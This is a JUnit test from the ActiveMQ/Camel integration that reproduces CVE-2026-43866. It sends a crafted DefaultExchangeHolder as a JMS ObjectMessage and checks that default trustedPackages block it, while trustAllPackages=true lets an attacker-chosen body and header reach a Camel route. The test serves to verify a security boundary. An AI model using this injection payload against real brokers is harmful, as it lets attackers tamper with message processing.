/**
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.activemq.camel;

import java.io.Serializable;

import javax.jms.Connection;
import javax.jms.MessageProducer;
import javax.jms.ObjectMessage;
import javax.jms.Queue;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.camel.component.ActiveMQComponent;
import org.apache.camel.CamelContext;
import org.apache.camel.Exchange;
import org.apache.camel.builder.RouteBuilder;
import org.apache.camel.component.mock.MockEndpoint;
import org.apache.camel.impl.DefaultCamelContext;
import org.apache.camel.impl.DefaultExchange;
import org.apache.camel.impl.DefaultExchangeHolder;
import org.junit.Assert;
import org.junit.Test;

/**
 * Reproducer for CVE-2026-43866 (Apache Camel {@code camel-jms}
 * {@code DefaultExchangeHolder} ObjectMessage deserialization bypass) as it
 * actually applies -- or does not -- to the ActiveMQ / Camel integration.
 *
 * <p>The Camel flaw: an attacker who can publish a JMS {@code ObjectMessage}
 * whose payload is a serialized {@code org.apache.camel.impl.DefaultExchangeHolder}
 * to a queue consumed by a Camel route causes {@code JmsBinding.extractBodyFromJms}
 * to call {@code DefaultExchangeHolder.unmarshal(...)}, injecting attacker-chosen
 * body / headers / properties into the Exchange -- without the {@code transferExchange}
 * option, and using only trusted java.* types inside the holder.</p>
 *
 * <p><b>But</b> for an ActiveMQ message, {@code extractBodyFromJms} first calls
 * {@code ActiveMQObjectMessage.getObject()}, which deserializes through ActiveMQ's
 * own {@code ClassLoadingAwareObjectInputStream}, gated by {@code trustedPackages}.
 * ActiveMQ's default trusted packages are:</p>
 * <pre>java.lang, org.apache.activemq, org.fusesource.hawtbuf, com.thoughtworks.xstream.mapper</pre>
 * <p>which do <b>not</b> include {@code org.apache.camel}. So the holder's class is
 * rejected at {@code getObject()} <i>before</i> Camel's flawed filter (or unmarshal)
 * is ever reached.</p>
 *
 * <p>This test pins down the real boundary. Run it against <b>stock Camel</b> (the
 * pre-fix version, e.g. {@code -Dcamel-version=2.25.4}):</p>
 * <ul>
 *   <li>{@link #defaultConfig_holderRejected_notVulnerable()} -- default ActiveMQ
 *       trust: the holder is refused, the route receives nothing. ActiveMQ is
 *       <b>NOT vulnerable</b> in its default configuration.</li>
 *   <li>{@link #trustAllPackages_holderUnmarshalled_vulnerable()} -- only when the
 *       operator sets {@code trustAllPackages=true} (i.e. has torn down ActiveMQ's
 *       deserialization guard) does the holder unmarshal and the attacker body land
 *       in the route.</li>
 * </ul>
 *
 * <p>If these hold on stock Camel, then the Camel-side {@code objectMessageEnabled}
 * fix is not required to protect a default ActiveMQ deployment -- ActiveMQ's
 * {@code trustedPackages} already blocks the attack.</p>
 */
public class Cve202643866ReproTest {

    private static final String ATTACKER_BODY = "PWNED-BODY";
    private static final String QUEUE = "cve43866.in";

    @Test
    public void defaultConfig_holderRejected_notVulnerable() throws Exception {
        final int delivered = runAttack(false);
        Assert.assertEquals(
                "Default ActiveMQ trustedPackages must reject the org.apache.camel "
                        + "DefaultExchangeHolder payload at getObject(), so the Camel route "
                        + "receives NOTHING -> ActiveMQ is NOT vulnerable in default config.",
                0, delivered);
    }

    @Test
    public void trustAllPackages_holderUnmarshalled_vulnerable() throws Exception {
        final int delivered = runAttack(true);
        Assert.assertEquals(
                "With trustAllPackages=true the operator has disabled ActiveMQ's "
                        + "deserialization guard, so the holder unmarshals and attacker state "
                        + "is injected -> vulnerable ONLY in this non-default configuration.",
                1, delivered);
    }

    /**
     * Sends the CVE-2026-43866 attack payload (a {@link DefaultExchangeHolder}
     * carrying an attacker-chosen body) as a JMS ObjectMessage to a queue consumed
     * by a Camel route, and returns how many messages carrying the attacker body
     * actually reached the route.
     *
     * @param trustAllPackages whether ActiveMQ deserialization trust is widened
     */
    private int runAttack(final boolean trustAllPackages) throws Exception {
        final String brokerUrl = "vm://cve43866-" + (trustAllPackages ? "trust" : "default")
                + "?broker.persistent=false&broker.useJmx=false";

        final ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory(brokerUrl);
        cf.setTrustAllPackages(trustAllPackages);
        // fail fast rather than retry the poisoned message repeatedly
        cf.getRedeliveryPolicy().setMaximumRedeliveries(0);

        final CamelContext camel = new DefaultCamelContext();
        final ActiveMQComponent amq = new ActiveMQComponent();
        amq.setConnectionFactory(cf);
        amq.setTrustAllPackages(trustAllPackages);
        camel.addComponent("activemq", amq);

        camel.addRoutes(new RouteBuilder() {
            @Override
            public void configure() {
                // convertBodyTo forces body extraction (getObject -> ActiveMQ filter)
                // to happen inside routing, so a rejected class fails here and never
                // reaches the mock.
                from("activemq:queue:" + QUEUE)
                        .convertBodyTo(String.class)
                        .to("mock:result");
            }
        });

        final MockEndpoint mock = camel.getEndpoint("mock:result", MockEndpoint.class);
        camel.start();
        try {
            final Serializable holder = maliciousHolder(camel);

            final Connection conn = cf.createConnection();
            conn.start();
            final Session sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
            final Queue queue = sess.createQueue(QUEUE);
            final MessageProducer producer = sess.createProducer(queue);
            final ObjectMessage msg = sess.createObjectMessage(holder);
            producer.send(msg);
            conn.close();

            // allow the consumer to attempt delivery (poisoned msg would DLQ)
            Thread.sleep(2500);

            final int received = mock.getReceivedCounter();
            if (received > 0) {
                // prove it's the ATTACKER's state that was injected, not something benign
                final Object body = mock.getReceivedExchanges().get(0).getIn().getBody();
                Assert.assertEquals("attacker-controlled body should have been injected",
                        ATTACKER_BODY, body);
            }
            return received;
        } finally {
            camel.stop();
        }
    }

    /**
     * Builds the attack object: a {@link DefaultExchangeHolder} marshalled from an
     * Exchange whose IN body is attacker-controlled. This is exactly the payload
     * CVE-2026-43866 abuses -- a holder in the {@code org.apache.camel} namespace.
     */
    private Serializable maliciousHolder(final CamelContext camel) {
        final Exchange attack = new DefaultExchange(camel);
        attack.getIn().setBody(ATTACKER_BODY);
        attack.getIn().setHeader("x-injected", "attacker-value");
        return DefaultExchangeHolder.marshal(attack);
    }
}
